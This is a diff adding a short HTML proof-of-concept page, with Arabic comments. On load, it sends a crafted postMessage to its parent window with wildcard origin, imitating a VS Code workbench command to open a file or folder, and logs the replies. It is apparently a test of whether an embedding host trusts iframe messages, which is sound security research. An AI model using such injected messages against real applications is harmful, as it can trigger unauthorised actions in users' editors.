@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>iframe PoC</title>
+</head>
+<body>
+  <h2>PoC - Send PostMessage to Parent</h2>
+
+  <script>
+    // الرسالة التي سنرسلها إلى النافذة الأم
+    const message = {
+      direction: "from-toloka-script",
+      vscodeMessage: {
+        command: "workbench.action.files.openFileFolder",
+        arguments: []
+      },
+      vscodeScheduleAsyncWork: 123456
+    };
+
+    // إرسال الرسالة بعد ثانية من تحميل الصفحة
+    setTimeout(() => {
+      console.log("📤 Sending message to parent");
+      parent.postMessage(message, "*");
+    }, 1000);
+
+    // تسجيل أي رسالة تصلك من parent
+    window.addEventListener("message", (event) => {
+      console.log("📥 Received message from parent:", event.data);
+    });
+  </script>
+</body>
+</html>
+
